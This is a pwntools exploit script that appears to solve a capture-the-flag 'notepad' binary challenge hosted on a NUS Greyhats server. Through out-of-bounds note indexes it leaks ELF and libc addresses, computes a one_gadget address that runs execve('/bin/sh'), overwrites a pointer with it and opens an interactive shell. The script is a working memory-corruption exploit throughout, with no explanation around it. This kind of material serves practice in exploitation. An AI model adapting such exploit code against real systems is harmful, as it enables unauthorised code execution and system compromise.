from pwn import *

def readNotes(loc) :
    p.clean()
    p.sendline(b'2')
    p.sendline(str(loc))
    p.recvuntil(b'Name: ')
    x = p.recvline().rstrip()
    return x

def writeNotes(loc, v1, v2) :
    p.clean()
    p.sendline(b'1')
    p.sendline(str(loc))
    p.sendline(v1)
    p.sendline(v2)


SERVER = 'challs1.nusgreyhats.org'
PORT = 5001

elf = ELF('./notepad.o')
libc = ELF('./libc.so.6')

if args.REMOTE :
    p = remote(SERVER, PORT)
else :
    p = process('./notepad.o')

if args.GDB:
    gdb.attach(p)

elf_leak = unpack(readNotes(-7), 'all')
libc_leak = unpack(readNotes(-1), 'all')

log.info(f"ELF leak: {hex(elf_leak)}")
log.info(f"libc leak: {hex(libc_leak)}")

# Manually found offset for pos -6 (elf)
elf_offset = 0x560c5d0d2640 - 0x560c5d0d2000
elf.address = elf_leak - elf_offset

libc.address = libc_leak - libc.sym._IO_2_1_stdin_

# one_gadget ./libc.so.6
# 0xe6c7e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL
#
# 0xe6c81 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL
#
# 0xe6c84 execve("/bin/sh", rsi, rdx)
# constraints:
#  [rsi] == NULL || rsi == NULL
#  [rdx] == NULL || rdx == NULL

# binsh = libc.address + 0xe6c7e
binsh = libc.address + 0xe6c81
# binsh = libc.address + 0xe6c84
print(hex(binsh))
print(hex(elf.sym.notes))

for i in range(-10, 0):
    x = readNotes(i)
    x = unpack(x, 'all')
    print(hex(x))

writeNotes(-3, p64(binsh), '1')

p.clean()
p.sendline('1')
writeNotes(100000, '1', '1')

p.interactive()

